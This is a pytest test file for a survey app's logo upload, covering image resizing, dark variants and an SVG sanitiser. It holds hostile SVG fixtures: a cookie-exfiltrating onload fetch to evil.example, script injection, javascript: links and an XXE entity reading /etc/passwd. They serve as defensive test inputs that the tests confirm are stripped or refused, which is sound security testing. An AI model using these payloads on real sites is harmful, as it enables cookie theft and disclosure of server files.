"""The logo of a survey's theme: PNG, JPEG, WebP or SVG; shown above every survey page. SVG files are written
anew from an allow-list and served so that nothing in them can run (app/svg_safe.py, app/media.py)."""
import io
import os

import pytest
from PIL import Image

from tests.conftest import add, fill_consent

from app import svg_safe, theme
from app.extensions import db
from app.models import Survey

SVG = (b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 64">'
       b'<rect width="240" height="64" fill="#00549f"/><text x="12" y="42" fill="#ffffff" font-family="Arial">Institut</text></svg>')
HOSTILE = (b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10" '
           b'onload="fetch(\'https://evil.example/?c=\'+document.cookie)">'
           b'<script>alert(document.domain)</script>'
           b'<script xlink:href="https://evil.example/x.js"/>'
           b'<rect width="10" height="10" fill="url(https://evil.example/track.png)" onclick="alert(1)" '
           b'style="fill: #00549f; background: url(https://evil.example/t.gif); stroke: expression(alert(1))"/>'
           b'<use xlink:href="https://evil.example/sprite.svg#a"/><use href="#ok"/>'
           b'<a xlink:href="javascript:alert(1)"><circle id="ok" r="2"/></a>'
           b'<animate attributeName="href" values="javascript:alert(1)"/><set attributeName="onmouseover" to="alert(1)"/>'
           b'<path d="M0 0L5 5" stroke="#000"/></svg>')


def png(width=300, height=80, colour=(0, 84, 159, 255)):
    out = io.BytesIO()
    Image.new("RGBA", (width, height), colour).save(out, format="PNG")
    return out.getvalue()


def upload(client, data, name="logo.png", variant="light", rights="1"):
    form = {"file": (io.BytesIO(data), name), "variant": variant}
    if rights:
        form["rights"] = rights
    return client.post("/surveys/1/design/logo", data=form, content_type="multipart/form-data", follow_redirects=True).data.decode()


def logo_of(client):
    with client.application.app_context():
        return (theme.clean(db.session.get(Survey, 1).theme) or {}).get("logo")


def stored(client, name):
    with client.application.app_context():
        return os.path.join(client.application.config["UPLOAD_FOLDER"], db.session.get(Survey, 1).uid, name)


def test_raster_logo_is_stored_small_and_shown_on_the_pages(client, survey):
    fill_consent(client)
    add(client, "single_choice")
    html = upload(client, png(2400, 600, (0, 84, 159, 0)))
    assert "Logo hochgeladen" in html and "Alternativtext" in html
    logo = logo_of(client)
    assert (logo["w"], logo["h"]) == (1200, 300) and logo["file"].endswith(".png")
    with Image.open(stored(client, logo["file"])) as img:
        assert img.size == (1200, 300) and img.mode == "RGBA" and img.getpixel((5, 5))[3] == 0   # transparency kept
    # texts, position and size belong to the form of the page; the file stays
    client.post("/surveys/1/design", data={**theme.STANDARD, "font": "system", "font_scale": "100", "radius": "soft",
                                           "logo_fields": "1", "logo_alt_de": "Institut für Beispiele", "logo_alt_en": "Institute of Examples",
                                           "logo_position": "right", "logo_size": "l"})
    assert logo_of(client)["file"] == logo["file"]
    page = client.get("/surveys/1/editor/preview").data.decode()
    assert '<div class="p-logo p-logo-right"><img src="/media/' in page and logo["file"] in page
    assert 'alt="Institut für Beispiele" width="288" height="72"' in page     # 72 px high, proportions kept
    assert 'alt="Institute of Examples"' in client.get("/surveys/1/editor/preview?lang=en").data.decode()
    assert "<style>body.participant" not in page                              # still the standard colours
    assert "p-logo" not in client.get("/surveys/1/editor/items/2/frame?lang=de").data.decode()  # not in the element preview
    # the live preview takes position and size from the query
    sample = client.get("/surveys/1/design/sample?accent=%232a5db0&background=%23ffffff&text=%231d1d1b&surface=%23ffffff"
                        "&logo_position=center&logo_size=s").data.decode()
    assert 'class="p-logo p-logo-center"' in sample and 'height="32"' in sample
    # "Auf Standard zurücksetzen" resets the colours, not the logo
    client.post("/surveys/1/design", data={"reset": "1"})
    assert logo_of(client)["file"] == logo["file"]


def test_what_is_refused(client, survey):
    assert "Bitte bestätigen Sie" in upload(client, png(), rights="")
    gif = io.BytesIO()
    Image.new("P", (10, 10)).save(gif, format="GIF")
    assert "PNG, JPEG, WebP oder SVG" in upload(client, gif.getvalue(), "logo.gif")
    assert "PNG, JPEG, WebP oder SVG" in upload(client, b"MZ\x90\x00 not an image", "logo.png")
    assert "größer als 2 MB" in upload(client, b"\x89PNG\r\n\x1a\n" + b"0" * (2 * 1024 * 1024 + 10))
    assert "zuerst das Logo für helle Hintergründe" in upload(client, png(), variant="dark")
    assert logo_of(client) is None


def test_dark_variant_and_removing(client, survey):
    upload(client, png())
    upload(client, png(300, 80, (255, 255, 255, 255)), variant="dark")
    logo = logo_of(client)
    light, dark = logo["file"], logo["file_dark"]
    assert os.path.exists(stored(client, light)) and os.path.exists(stored(client, dark))
    assert light in client.get("/surveys/1/editor/preview").data.decode()
    client.post("/surveys/1/design", data={"accent": "#7ea6e6", "background": "#141517", "text": "#e7e5e0", "surface": "#1c1e21",
                                           "font": "system", "font_scale": "100", "radius": "soft"})
    page = client.get("/surveys/1/editor/preview").data.decode()
    assert dark in page and light not in page                                  # dark background: the dark variant
    # a new file replaces the old one on disk
    upload(client, png(200, 50), variant="dark")
    assert not os.path.exists(stored(client, dark)) and logo_of(client)["file_dark"] != dark
    dark = logo_of(client)["file_dark"]
    client.post("/surveys/1/design/logo/remove", data={"variant": "dark"})
    assert "file_dark" not in logo_of(client) and not os.path.exists(stored(client, dark))
    client.post("/surveys/1/design/logo/remove", data={"variant": "light"})
    assert logo_of(client) is None and not os.path.exists(stored(client, light))
    assert "p-logo" not in client.get("/surveys/1/editor/preview").data.decode()


def test_svg_logo_is_cleaned_and_served_inert(client, survey):
    assert "Logo hochgeladen" in upload(client, HOSTILE, "logo.svg")
    logo = logo_of(client)
    assert logo["file"].endswith(".svg") and (logo["w"], logo["h"]) == (10, 10)
    with open(stored(client, logo["file"]), encoding="utf-8") as f:
        text = f.read()
    for gone in ("script", "onload", "onclick", "evil.example", "javascript", "expression", "animate", "<set", "xlink", "<a ", "cookie"):
        assert gone not in text, gone
    assert 'fill: #00549f' in text and '<use href="#ok"' in text and '<path d="M0 0L5 5" stroke="#000"' in text
    with client.application.app_context():
        uid = db.session.get(Survey, 1).uid
    r = client.get(f"/media/{uid}/{logo['file']}")
    assert r.status_code == 200 and r.headers["Content-Type"].startswith("image/svg+xml")
    csp = r.headers["Content-Security-Policy"]
    assert "default-src 'none'" in csp and "sandbox" in csp and "script-src" not in csp
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    # shown as an image, never inline
    page = client.get("/surveys/1/design/sample").data.decode()
    assert f'<img src="/media/{uid}/{logo["file"]}"' in page and "<svg xmlns" not in page.split('class="p-logo')[1][:400]


@pytest.mark.parametrize("data, message", [
    (b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><text>&xxe;</text></svg>', "DOCTYPE"),
    (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><style>.a{fill:red}</style><rect class="a" width="1" height="1"/></svg>',
     "Stylesheet"),
    (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><image href="data:image/png;base64,AAAA" width="1" height="1"/></svg>',
     "Pixelbild"),
    (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">'
     b'<iframe src="https://evil.example"/></body></foreignObject></svg>', "HTML"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>', "Größe"),
    (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><script>alert(1)</script></svg>', "keine Zeichnung"),
    (b'<svg viewBox="0 0 1 1"><rect width="1" height="1"/></svg>', "keine SVG-Grafik"),
    (b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><rect', "nicht lesen"),
])
def test_svg_files_that_are_refused(data, message):
    with pytest.raises(svg_safe.Refused) as e:
        svg_safe.clean(data)
    assert message in str(e.value)


def test_svg_limits():
    with pytest.raises(svg_safe.Refused):
        svg_safe.clean(b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1">' + b"<g/>" * 6000 + b"</svg>")
    with pytest.raises(svg_safe.Refused):
        svg_safe.clean(SVG.replace(b"</svg>", b"<!--" + b"x" * 210 * 1024 + b"--></svg>"))
    clean, w, h = svg_safe.clean(SVG)
    assert (w, h) == (240, 64) and b"Institut" in clean and b"<?xml" not in clean


def test_logo_without_alternative_text_is_reported(client, survey):
    from app import design

    def mine():
        with client.application.app_context():
            return [f for f in design.check(db.session.get(Survey, 1)) if "Logo" in f.message]

    assert mine() == []
    upload(client, SVG, "logo.svg")
    assert len(mine()) == 1 and mine()[0].severity == "warning" and "(DE, EN)" in mine()[0].message
    base = {**theme.STANDARD, "font": "system", "font_scale": "100", "radius": "soft", "logo_fields": "1",
            "logo_position": "left", "logo_size": "m"}
    client.post("/surveys/1/design", data={**base, "logo_alt_de": "Institut"})
    assert "(EN)" in mine()[0].message
    client.post("/surveys/1/design", data={**base, "logo_decorative": "1"})
    assert mine() == []
    assert 'alt=""' in client.get("/surveys/1/design/sample").data.decode().split('class="p-logo')[1][:300]


def test_logo_is_locked_outside_the_draft(client, survey):
    upload(client, png())
    before = logo_of(client)["file"]
    with client.application.app_context():
        db.session.get(Survey, 1).status = Survey.RUNNING
        db.session.commit()
    assert "nur im Entwurf änderbar" in upload(client, png(100, 30))
    client.post("/surveys/1/design/logo/remove", data={"variant": "light"})
    assert logo_of(client)["file"] == before and os.path.exists(stored(client, before))
